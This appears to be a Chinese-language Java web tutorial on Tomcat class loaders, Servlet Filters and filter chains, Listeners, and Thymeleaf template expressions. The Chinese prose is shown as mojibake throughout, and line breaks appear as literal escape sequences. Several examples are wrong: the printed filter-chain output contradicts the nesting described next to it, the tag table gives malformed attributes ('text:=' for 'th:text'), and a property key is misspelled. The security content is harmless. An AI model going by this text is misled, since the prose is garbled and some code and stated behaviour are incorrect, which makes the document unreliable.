æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ª Java ç¨‹åºï¼Œå®ƒè¦åšçš„æ˜¯å»åŠ¨æ€åŠ è½½æˆ‘ä»¬ç¼–å†™çš„ Web åº”ç”¨ç¨‹åºä¸­çš„ç±»ï¼Œè€Œè¦è§£å†³ä»¥ä¸Šæåˆ°çš„ä¸€äº›é—®é¢˜ï¼Œå°±å‡ºç°äº†å‡ ä¸ªæ–°çš„ç±»åŠ è½½å™¨ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å„ä¸ªåŠ è½½å™¨çš„ä¸åŒä¹‹å¤„ï¼š\n\n| åŠ è½½å™¨               | æè¿°                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| Common ClassLoader   | Tomcatæœ€åŸºæœ¬çš„ç±»åŠ è½½å™¨ã€‚åŠ è½½è·¯å¾„ä¸­çš„classå¯ä»¥è¢«Tomcatå®¹å™¨æœ¬èº«ä»¥åŠå„ä¸ªWebåº”ç”¨ç¨‹åºè®¿é—®ã€‚ |\n| Catalina ClassLoader | Tomcatå®¹å™¨ç§æœ‰çš„ç±»åŠ è½½å™¨ã€‚åŠ è½½è·¯å¾„ä¸­çš„classå¯¹äºWebåº”ç”¨ç¨‹åºä¸å¯è§ã€‚ |\n| Shared ClassLoader   | å„ä¸ªWebåº”ç”¨ç¨‹åºå…±äº«çš„ç±»åŠ è½½å™¨ã€‚åŠ è½½è·¯å¾„ä¸­çš„classå¯¹äºæ‰€æœ‰Webåº”ç”¨ç¨‹åºå¯è§ï¼Œä½†æ˜¯å¯¹äºTomcatå®¹å™¨ä¸å¯è§ã€‚ |\n| Webapp ClassLoader   | å„ä¸ªWebåº”ç”¨ç¨‹åºç§æœ‰çš„ç±»åŠ è½½å™¨ã€‚åŠ è½½è·¯å¾„ä¸­çš„classåªå¯¹å½“å‰Webåº”ç”¨ç¨‹åºå¯è§ï¼Œæ¯ä¸ªWebåº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œæ­¤åŠ è½½å™¨å¯èƒ½å­˜åœ¨å¤šä¸ªå®ä¾‹ã€‚ |\n| JasperLoader         | JSPç±»åŠ è½½å™¨ã€‚æ¯ä¸ªJSPæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤åŠ è½½å™¨å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªå®ä¾‹ã€‚ |\n\né€šè¿‡è¿™æ ·è¿›è¡Œåˆ’åˆ†ï¼Œå°±å¾ˆå¥½åœ°è§£å†³äº†æˆ‘ä»¬ä¸Šé¢æ‰€æåˆ°çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œè¿™æ ·çš„ç±»åŠ è½½æœºåˆ¶ï¼Œç ´åäº†JDK çš„`åŒäº²å§”æ´¾æœºåˆ¶`ï¼Œæ¯”å¦‚ Webapp ClassLoaderï¼Œå®ƒåªåŠ è½½è‡ªå·±çš„ class æ–‡ä»¶ï¼Œå®ƒæ²¡æœ‰å°†ç±»äº¤ç»™çˆ¶ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥éšæ„åˆ›å»ºå’Œ JDK åŒåŒ…åŒåçš„ç±»ï¼Œå²‚ä¸æ˜¯å°±å‡ºé—®é¢˜äº†ï¼Ÿéš¾é“Tomcatçš„å¼€å‘å›¢é˜Ÿæ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸ªé—®é¢˜å—ï¼Ÿ\n\n![](https://img.jwt1399.top/img/202205202322444.jpg)\n\nå®é™…ä¸Šï¼ŒWebApp ClassLoader çš„åŠ è½½æœºåˆ¶æ˜¯è¿™æ ·çš„ï¼šWebApp ClassLoader åŠ è½½ç±»çš„æ—¶å€™ï¼Œç»•å¼€äº† App ClassLoaderï¼Œç›´æ¥å…ˆä½¿ç”¨ Ext ClassLoader æ¥åŠ è½½ç±»ã€‚è¿™æ ·çš„è¯ï¼Œå¦‚æœå®šä¹‰äº†åŒåŒ…åŒåçš„ç±»ï¼Œå°±ä¸ä¼šè¢«åŠ è½½ï¼Œè€Œå¦‚æœæ˜¯è‡ªå·±å®šä¹‰çš„ç±»ï¼Œç”±äºè¯¥ç±»å¹¶ä¸æ˜¯ JDK å†…éƒ¨æˆ–æ˜¯æ‰©å±•ç±»ï¼Œæ‰€æœ‰ä¸ä¼šè¢«åŠ è½½ï¼Œè€Œæ˜¯å†æ¬¡å›åˆ° WebApp ClassLoader è¿›è¡ŒåŠ è½½ï¼Œå¦‚æœè¿˜å¤±è´¥ï¼Œå†ä½¿ç”¨ AppClassloader è¿›è¡ŒåŠ è½½ã€‚\n\n## Filter\n\n### Filterç®€ä»‹\n\næœ‰äº† Session ä¹‹åï¼Œå°±å¯ä»¥å¾ˆå¥½åœ°æ§åˆ¶ç”¨æˆ·çš„ç™»é™†éªŒè¯äº†ï¼Œåªæœ‰æˆæƒçš„ç”¨æˆ·ï¼Œæ‰å¯ä»¥è®¿é—®ä¸€äº›é¡µé¢ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸€ä¸ªå»è¿›è¡Œé…ç½®ï¼Œè¿˜æ˜¯å¤ªè¿‡å¤æ‚ï¼Œèƒ½å¦ä¸€æ¬¡æ€§åœ°è¿‡æ»¤æ‰æ²¡æœ‰ç™»å½•éªŒè¯çš„ç”¨æˆ·å‘¢ï¼Ÿ\n\nFilterè¿‡æ»¤å™¨ç›¸å½“äºåœ¨æ‰€æœ‰è®¿é—®å‰åŠ äº†ä¸€å µå¢™ï¼Œæ¥è‡ªæµè§ˆå™¨çš„æ‰€æœ‰è®¿é—®è¯·æ±‚éƒ½ä¼šé¦–å…ˆç»è¿‡Filterè¿‡æ»¤å™¨ï¼Œåªæœ‰è¿‡æ»¤å™¨å…è®¸é€šè¿‡çš„è¯·æ±‚ï¼Œæ‰å¯ä»¥é¡ºåˆ©åœ°åˆ°è¾¾å¯¹åº”çš„Servletï¼Œè€Œè¿‡æ»¤å™¨ä¸å…è®¸çš„é€šè¿‡çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç”±åœ°è¿›è¡Œæ§åˆ¶æ˜¯å¦è¿›è¡Œé‡å®šå‘æˆ–æ˜¯è¯·æ±‚è½¬å‘ã€‚å¹¶ä¸”è¿‡æ»¤å™¨å¯ä»¥æ·»åŠ å¾ˆå¤šä¸ªã€‚\n\n![](https://img.jwt1399.top/img/image-20220427133711464.png)\n\n### åˆ›å»ºè¿‡æ»¤å™¨\n\nå®šä¹‰ç±»ï¼Œå®ç° Filter æ¥å£ï¼Œå¹¶é‡å†™å…¶æ–¹æ³•ï¼Œå¹¶æ·»åŠ `@WebFilter`æ³¨è§£\n\n```java\n@WebFilter(\"/*\")   //é…ç½®Filteræ‹¦æˆªèµ„æºçš„è·¯å¾„ï¼Œ/* è¡¨ç¤ºæ‹¦æˆªæ‰€æœ‰çš„èµ„æº\npublic class TestFilter1 implements Filter {\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        \n    }\n}\n```\n\nç°åœ¨æˆ‘ä»¬å‘èµ·çš„æ‰€æœ‰è¯·æ±‚ï¼Œä¸€å¾‹éœ€è¦ç»è¿‡æ­¤è¿‡æ»¤å™¨ï¼Œå¹¶ä¸”æ‰€æœ‰çš„è¯·æ±‚éƒ½æ²¡æœ‰ä»»ä½•çš„å“åº”å†…å®¹ã€‚\n\né‚£ä¹ˆå¦‚ä½•è®©è¯·æ±‚å¯ä»¥é¡ºåˆ©åœ°åˆ°è¾¾å¯¹åº”çš„ Servletï¼Œåªéœ€è¦æ·»åŠ ä¸€å¥æ”¾è¡Œè¯­å¥\n\n```java\nfilterChain.doFilter(servletRequest, servletResponse);//æ”¾è¡Œï¼Œï¼Œä¹Ÿå°±æ˜¯è®©å…¶è®¿é—®æœ¬è¯¥è®¿é—®çš„èµ„æºã€‚\n```\n\nç”±äºæˆ‘ä»¬æ•´ä¸ªåº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™è¡Œä»£ç çš„æ„æ€å®é™…ä¸Šæ˜¯å°†æ­¤è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå½“æ²¡æœ‰ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æ—¶ï¼Œæ‰ä¼šåˆ°è¾¾å¯¹åº”çš„Servletè¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¥åˆ›å»ºä¸€ä¸ªè¿‡æ»¤å™¨çœ‹çœ‹æ•ˆæœ\n\n```java\n@WebFilter(\"/*\")\npublic class TestFilter2 implements Filter {\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"æˆ‘æ˜¯2å·è¿‡æ»¤å™¨\");\n        filterChain.doFilter(servletRequest, servletResponse);\n    }\n}\n```\n\n### è¿‡æ»¤å™¨é“¾\n\nè¿‡æ»¤å™¨é“¾æ˜¯æŒ‡åœ¨ä¸€ä¸ªWebåº”ç”¨ï¼Œå¯ä»¥é…ç½®å¤šä¸ªè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨çš„è¿‡æ»¤é¡ºåºæ˜¯æŒ‰ç…§ç±»åçš„è‡ªç„¶æ’åºè¿›è¡Œçš„ï¼Œåœ¨ç»è¿‡ç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨ä¹‹åï¼Œä¼šç»§ç»­å‰å¾€ç¬¬äºŒä¸ªè¿‡æ»¤å™¨ï¼Œåªæœ‰ä¸¤ä¸ªè¿‡æ»¤å™¨å…¨éƒ¨ç»è¿‡ä¹‹åï¼Œæ‰ä¼šåˆ°è¾¾æˆ‘ä»¬çš„Servletä¸­ã€‚\n\n![](https://img.jwt1399.top/img/image-20220427133421324.png)\n\nå®é™…ä¸Šï¼Œå½“`doFilter`æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå°±ä¼šä¸€ç›´å‘ä¸‹ç›´åˆ°Servletï¼Œåœ¨Servletå¤„ç†å®Œæˆä¹‹åï¼Œåˆä¾æ¬¡è¿”å›åˆ°æœ€å‰é¢çš„Filterï¼Œç±»ä¼¼äºé€’å½’çš„ç»“æ„ï¼Œæˆ‘ä»¬æ·»åŠ å‡ ä¸ªè¾“å‡ºè¯­å¥æ¥åˆ¤æ–­ä¸€ä¸‹ï¼š\n\n```java\n@WebFilter(\"/*\") \npublic class TestFilter1 implements Filter {\n  @Override\n  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException     {\n    System.out.println(\"æˆ‘æ˜¯1å·è¿‡æ»¤å™¨æ”¾è¡Œå‰é€»è¾‘ä»£ç \");\n    filterChain.doFilter(servletRequest, servletResponse);\n    System.out.println(\"æˆ‘æ˜¯1å·è¿‡æ»¤å™¨æ”¾è¡Œåé€»è¾‘ä»£ç \");\n  }\n}\n```\n\n```java\n@WebFilter(\"/*\") \npublic class TestFilter2 implements Filter {\n@Override\n  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n    System.out.println(\"æˆ‘æ˜¯2å·è¿‡æ»¤å™¨æ”¾è¡Œå‰é€»è¾‘ä»£ç \");\n    filterChain.doFilter(servletRequest, servletResponse);\n    System.out.println(\"æˆ‘æ˜¯2å·è¿‡æ»¤å™¨æ”¾è¡Œåé€»è¾‘ä»£ç \");\n  }\n}\n```\n\n```java\n//è¾“å‡º\næˆ‘æ˜¯1å·è¿‡æ»¤å™¨æ”¾è¡Œå‰é€»è¾‘ä»£ç \næˆ‘æ˜¯2å·è¿‡æ»¤å™¨æ”¾è¡Œå‰é€»è¾‘ä»£ç \næˆ‘æ˜¯1å·è¿‡æ»¤å™¨æ”¾è¡Œåé€»è¾‘ä»£ç \næˆ‘æ˜¯2å·è¿‡æ»¤å™¨æ”¾è¡Œåé€»è¾‘ä»£ç \n```\n\n### HttpFilter\n\nåŒ Servlet ä¸€æ ·ï¼ŒFilter ä¹Ÿæœ‰å¯¹åº”çš„ HttpFilter ä¸“ç”¨ç±»ï¼Œå®ƒé’ˆå¯¹ HTTP è¯·æ±‚è¿›è¡Œäº†ä¸“é—¨å¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ç»§æ‰¿ HttpFilter æ¥ç¼–å†™\n\n```java\n@WebFilter(\"/*\")\npublic class MainFilter extends HttpFilter {\n    @Override\n    protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {\n        //...\n    }\n}\n```\n\n## Listener\n\nå¦‚æœæˆ‘ä»¬å¸Œæœ›ï¼Œåœ¨åº”ç”¨ç¨‹åºåŠ è½½çš„æ—¶å€™ï¼Œæˆ–æ˜¯ Session åˆ›å»ºçš„æ—¶å€™ï¼Œäº¦æˆ–æ˜¯åœ¨ Request å¯¹è±¡åˆ›å»ºçš„æ—¶å€™è¿›è¡Œä¸€äº›æ“ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨æ¥å®ç°ã€‚\n\n![](https://img.jwt1399.top/img/202205202323156.png)\n\né»˜è®¤ä¸ºæˆ‘ä»¬æä¾›äº†å¾ˆå¤šç±»å‹çš„ç›‘å¬å™¨ï¼Œæˆ‘ä»¬è¿™é‡Œå°±æ¼”ç¤ºä¸€ä¸‹ç›‘å¬Sessionçš„åˆ›å»ºå³å¯ï¼š\n\n```java\n@WebListener\npublic class TestListener implements HttpSessionListener {\n    @Override\n    public void sessionCreated(HttpSessionEvent se) {\n        System.out.println(\"æœ‰ä¸€ä¸ªSessionè¢«åˆ›å»ºäº†\");\n    }\n}\n```\n\næœ‰å…³ç›‘å¬å™¨ç›¸å…³å†…å®¹ï¼Œäº†è§£å³å¯ã€‚\n\n\n\n## Thymeleaf\n\n### ç®€ä»‹\n\n**Thymeleaf** æ˜¯ä¸€ä¸ªé€‚ç”¨äº Web å’Œç‹¬ç«‹ç¯å¢ƒçš„ç°ä»£åŒ–æœåŠ¡å™¨ç«¯ **Java æ¨¡æ¿å¼•æ“**\n\n**æ¨¡æ¿å¼•æ“**æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„ html æ–‡æ¡£ã€‚\n\n### å¿«é€Ÿå…¥é—¨\n\n1ã€é¦–å…ˆè¿˜æ˜¯æ–°å»ºä¸€ä¸ª Web é¡¹ç›®ï¼Œåœ¨åˆ›å»ºæ—¶å‹¾é€‰ Thymeleaf ä¾èµ–\n\n2ã€ç¼–å†™ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œåç§°ä¸º`test.html`ï¼Œæ”¾åœ¨ resource ç›®å½•ä¸‹ï¼Œåœ¨ html æ ‡ç­¾å†…éƒ¨æ·»åŠ `xmlns:th=\"http://www.thymeleaf.org\"`å¼•å…¥ Thymeleaf å®šä¹‰çš„æ ‡ç­¾å±æ€§\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n    <div th:text=\"${title}\"></div>\n</body>\n</html>\n```\n\n3ã€ç¼–å†™æ¨¡æ¿å¼•æ“ï¼Œè®¾ç½®é»˜è®¤é¡µé¢\n\n```java\n@WebServlet(\"/index\")\npublic class HelloServlet extends HttpServlet {\n    TemplateEngine engine;\n    @Override\n    public void init() throws ServletException {\n        engine = new TemplateEngine();\n        ClassLoaderTemplateResolver r = new ClassLoaderTemplateResolver();\n        engine.setTemplateResolver(r);\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        Context context = new Context();\n        context.setVariable(\"title\", \"æˆ‘æ˜¯æ ‡é¢˜\");\n        engine.process(\"test.html\", context, resp.getWriter());\n    }\n}\n```\n\næˆ‘ä»¬å‘ç°ï¼Œæµè§ˆå™¨å¾—åˆ°çš„é¡µé¢ï¼Œå°±æ˜¯å·²ç»ç»è¿‡æ¨¡æ¿å¼•æ“è§£æå¥½çš„é¡µé¢ï¼Œè€Œæˆ‘ä»¬çš„ä»£ç ä¾ç„¶æ˜¯åç«¯å¤„ç†æ•°æ®ï¼Œå‰ç«¯å±•ç¤ºæ•°æ®ï¼Œå› æ­¤ä½¿ç”¨ Thymeleaf å°±èƒ½å¤Ÿä½¿å¾—å½“å‰Webåº”ç”¨ç¨‹åºçš„å‰åç«¯åˆ’åˆ†æ›´åŠ æ¸…æ™°ã€‚\n\n### è¯­æ³•åŸºç¡€\n\n#### TemplateEngine\n\né¦–å…ˆæˆ‘ä»¬çœ‹çœ‹åç«¯éƒ¨åˆ†ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡`TemplateEngine`å¯¹è±¡æ¥å°†æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“ä¸ºæœ€ç»ˆçš„HTMLé¡µé¢ï¼š\n\n```java\nTemplateEngine engine;\n@Override\npublic void init() throws ServletException {\n    engine = new TemplateEngine();\n  \t//è®¾å®šæ¨¡æ¿è§£æå™¨å†³å®šäº†ä»å“ªé‡Œè·å–æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨ClassLoaderTemplateResolverè¡¨ç¤ºåŠ è½½å†…éƒ¨èµ„æºæ–‡ä»¶\n    ClassLoaderTemplateResolver r = new ClassLoaderTemplateResolver();\n    engine.setTemplateResolver(r);\n}\n```\n\næ­¤å¯¹è±¡åªéœ€è¦åˆ›å»ºä¸€æ¬¡ï¼Œä¹‹åå°±å¯ä»¥ä¸€ç›´ä½¿ç”¨äº†ã€‚æ¥ç€æˆ‘ä»¬æ¥çœ‹å¦‚ä½•ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œè§£æï¼š\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    //åˆ›å»ºä¸Šä¸‹æ–‡ï¼Œä¸Šä¸‹æ–‡ä¸­åŒ…å«äº†æ‰€æœ‰éœ€è¦æ›¿æ¢åˆ°æ¨¡æ¿ä¸­çš„å†…å®¹\n    Context context = new Context();\n    context.setVariable(\"title\", \"<h1>æˆ‘æ˜¯æ ‡é¢˜</h1>\");\n    //é€šè¿‡æ­¤æ–¹æ³•å°±å¯ä»¥ç›´æ¥è§£ææ¨¡æ¿å¹¶è¿”å›å“åº”\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\næ¥ä¸‹æ¥å°±å¯ä»¥åœ¨å‰ç«¯é¡µé¢ä¸­é€šè¿‡ä¸Šä¸‹æ–‡æä¾›çš„å†…å®¹ï¼Œæ¥å°†Javaä»£ç ä¸­çš„æ•°æ®è§£æåˆ°å‰ç«¯é¡µé¢ã€‚\n\n#### å¸¸ç”¨æ ‡ç­¾\n\n| æ ‡ç­¾      | ä½œç”¨               | ç¤ºä¾‹                                                         |\n| :-------- | :----------------- | :----------------------------------------------------------- |\n| th:id     | æ›¿æ¢id             | `<input th:id=\"${user.id}\"/>`                                |\n| th:text   | æ–‡æœ¬æ›¿æ¢           | `<p text:=\"${user.name}\">æµ‹è¯•</p>`                           |\n| th:utext  | æ”¯æŒhtmlçš„æ–‡æœ¬æ›¿æ¢ | `<p utext:=\"${htmlcontent}\">content</p>`                     |\n| th:object | æ›¿æ¢å¯¹è±¡           | `<div th:object=\"${user}\"></div>`                            |\n| th:value  | æ›¿æ¢å€¼             | `<input th:value=\"${user.name}\" >`                           |\n| th:each   | è¿­ä»£               | `<tr th:each=\"student:${user}\" >`                            |\n| th:href   | æ›¿æ¢è¶…é“¾æ¥         | `<a th:href=\"@{index.html}\">è¶…é“¾æ¥</a>`                      |\n| th:src    | æ›¿æ¢èµ„æº           | `<script type=\"text/javascript\" th:src=\"@{index.js}\"></script>` |\n\næ¯”å¦‚ç¤ºä¾‹ä¸­ç¼–å†™çš„ï¼š\n\n```html\n<div th:text=\"${title}\"></div>\n```\n\nä½¿ç”¨äº†`th:text`æ¥ä¸ºå½“å‰æ ‡ç­¾æŒ‡å®šå†…éƒ¨æ–‡æœ¬ï¼Œæ³¨æ„ä»»ä½•å†…å®¹éƒ½ä¼šå˜æˆæ™®é€šæ–‡æœ¬ï¼Œå³ä½¿ä¼ å…¥äº†ä¸€ä¸ªHTMLä»£ç \n\nå¦‚æœæˆ‘å¸Œæœ›å‘å†…éƒ¨æ·»åŠ ä¸€ä¸ªHTMLæ–‡æœ¬å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`th:utext`å±æ€§ï¼š\n\n```html\n<div th:utext=\"${title}\"></div>\n```\n\nä¼ å…¥çš„titleå±æ€§ï¼Œä¸ä»…ä»…åªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å€¼ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼•ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡æ­¤å¼•ç”¨è°ƒç”¨ç›¸å…³çš„æ–¹æ³•ï¼š\n\n```html\n<div th:text=\"${title.toLowerCase()}\"></div>\n```\n\nè¿™æ ·çœ‹æ¥ï¼ŒThymeleafæ—¢èƒ½ä¿æŒJSPä¸ºæˆ‘ä»¬å¸¦æ¥çš„ä¾¿æ·ï¼Œä¹Ÿèƒ½å…¼é¡¾å‰åç«¯ä»£ç çš„ç•Œé™åˆ’åˆ†ã€‚\n\né™¤äº†æ›¿æ¢æ–‡æœ¬ï¼Œå®ƒè¿˜æ”¯æŒæ›¿æ¢ä¸€ä¸ªå…ƒç´ çš„ä»»æ„å±æ€§ï¼Œæˆ‘ä»¬å‘ç°ï¼Œ`th:`èƒ½å¤Ÿæ‹¼æ¥å‡ ä¹æ‰€æœ‰çš„å±æ€§ï¼Œä¸€æ—¦ä½¿ç”¨`th:å±æ€§åç§°`ï¼Œé‚£ä¹ˆå±æ€§çš„å€¼å°±å¯ä»¥é€šè¿‡åç«¯æä¾›äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬ç°åœ¨æƒ³æ›¿æ¢ä¸€ä¸ªå›¾ç‰‡çš„é“¾æ¥ï¼š\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n    <img width=\"700\" th:src=\"${url}\" th:alt=\"${alt}\">\n</body>\n</html>\n```\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"url\", \"https://jwt1399.top/favicon.jpg\");\n  \tcontext.setVariable(\"alt\", \"å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥\");\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\nThymeleafè¿˜å¯ä»¥è¿›è¡Œä¸€äº›ç®—æœ¯è¿ç®—ï¼Œå‡ ä¹Javaä¸­çš„è¿ç®—å®ƒéƒ½å¯ä»¥æ”¯æŒï¼š\n\n```html\n<div th:text=\"${value % 2}\"></div>\n```\n\nåŒæ ·çš„ï¼Œå®ƒè¿˜æ”¯æŒä¸‰å…ƒè¿ç®—ï¼š\n\n```html\n<div th:text=\"${value % 2 == 0 ? 'yyds' : 'lbwnb'}\"></div>\n```\n\nå¤šä¸ªå±æ€§ä¹Ÿå¯ä»¥é€šè¿‡`+`è¿›è¡Œæ‹¼æ¥ï¼Œå°±åƒJavaä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥ä¸€æ ·ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œå­—ç¬¦ä¸²ä¸èƒ½ç›´æ¥å†™ï¼Œè¦æ·»åŠ å•å¼•å·ï¼š\n\n```html\n<div th:text=\"${name}+' æˆ‘æ˜¯æ–‡æœ¬ '+${value}\"></div>\n```\n\n#### è¡¨è¾¾å¼\n\n##### é“¾æ¥è¡¨è¾¾å¼: @{â€¦}\n\nå¦‚æœæƒ³å¼•å…¥é“¾æ¥æ¯”å¦‚linkï¼Œhrefï¼Œsrcï¼Œä½¿ç”¨`@{èµ„æºåœ°å€}`å¼•å…¥èµ„æº\n\n```html\n<link rel=\"stylesheet\" th:href=\"@{index.css}\">\n\n<script type=\"text/javascript\" th:src=\"@{index.js}\"></script>\n\n<a th:href=\"@{index.html}\">è¶…é“¾æ¥</a>\n```\n\n##### å˜é‡è¡¨è¾¾å¼: ${...}\n\né€šè¿‡`${â€¦}`è¿›è¡Œå–å€¼\n\n```html\n<h2>å–æ™®é€šå­—ç¬¦ä¸²</h2>\n<table border=\"0\">\n    <tr>\n        <td th:text=\"'æˆ‘çš„åå­—æ˜¯ï¼š'+${name}\"></td>\n    </tr>\n</table>\n\n\n<h2>å–JavaBeanå¯¹è±¡</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr>\n        <td>ä»‹ç»</td>\n        <td th:text=\"${user.name}\"></td>\n    </tr>\n    <tr>\n        <td>å¹´é¾„</td>\n        <td th:text=\"${user['age']}\"></td>\n    </tr>\n</table>\n\n<h2>å–Listå–å€¼</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr th:each=\"item:${userlist}\">\n        <td th:text=\"${item}\"></td>\n    </tr>\n</table>\n\n<h2>å–Mapå–å€¼</h2>\n<table bgcolor=\"#8fbc8f\" border=\"1\">\n    <tr>\n        <td>place:</td>\n        <td th:text=\"${map.get('place')}\"></td>\n    </tr>\n    <tr>\n        <td>feeling:</td>\n        <td th:text=\"${map['feeling']}\"></td>\n    </tr>\n</table>\n```\n\n##### é€‰æ‹©å˜é‡è¡¨è¾¾å¼: *{...}\n\nå˜é‡è¡¨è¾¾å¼ä¸ä»…å¯ä»¥å†™æˆ${...}ï¼Œè€Œä¸”è¿˜å¯ä»¥å†™æˆ*{...}ã€‚\n\nä½†æ˜¯ï¼Œæœ‰ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ï¼šæ˜Ÿå·è¯­æ³•é’ˆå¯¹é€‰å®šå¯¹è±¡è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡è¯„ä¼°è¡¨è¾¾å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ²¡æœ‰é€‰å®šçš„å¯¹è±¡ï¼Œç¾å…ƒ(`${â€¦}`)å’Œæ˜Ÿå·(`*{...}`)çš„è¯­æ³•å°±å®Œå…¨ä¸€æ ·ã€‚\n\nä»€ä¹ˆæ˜¯é€‰å®šå¯¹è±¡ï¼Ÿä½¿ç”¨`th:object`å±æ€§çš„è¡¨è¾¾å¼çš„ç»“æœã€‚å°±å¯ä»¥é€‰å®šå¯¹è±¡ï¼Œå…·ä½“å®ä¾‹å¦‚ä¸‹ï¼š\n\n```html\n<div th:object=\"${user}\">\n    <p>Name: <span th:text=\"*{name}\">å°æ˜</span></p>\n    <p>Age: <span th:text=\"*{age}\">18</span></p>\n    <p>Detail: <span th:text=\"*{detail}\">å¥½å¥½å­¦ä¹ </span>.</p>\n</div>\n```\n\nå½“ç„¶`*{â€¦}`ä¹Ÿå¯å’Œ`${â€¦}`æ··ç”¨ã€‚ä¸Šé¢çš„ä»£ç å¦‚æœä¸ä½¿ç”¨é€‰å®šå¯¹è±¡ï¼Œå®Œå…¨ç­‰ä»·äºï¼š\n\n```html\n<div>\n    <p>Name: <span th:text=\"*{user.name}\">å°æ˜</span>.</p>\n    <p>Age: <span th:text=\"${user.age}\">18</span>.</p>\n    <p>Detail: <span th:text=\"${user.detail}\">å¥½å¥½å­¦ä¹ </span>.</p>\n</div>\n```\n\n##### æ¶ˆæ¯è¡¨è¾¾: #{...}\n\n`#{â€¦}`æ˜¯ç”¨æ¥**è¯»å–é…ç½®æ–‡ä»¶ä¸­æ•°æ®**çš„ã€‚\n\n```html\n<h2>æ¶ˆæ¯è¡¨è¾¾</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr>\n    <td>name</td>\n    <td th:text=\"#{jwt.name}\"></td>\n    </tr>\n    <tr>\n    <td>å¹´é¾„</td>\n    <td th:text=\"#{jwt.age}\"></td>\n    </tr>\n    <tr>\n    <td>province</td>\n    <td th:text=\"#{province}\"></td>\n    </tr>\n</table>\n```\n\ntest.properties\n\n```properties\njwt.nane=jianjian\njwt.age=20\n```\n\n### 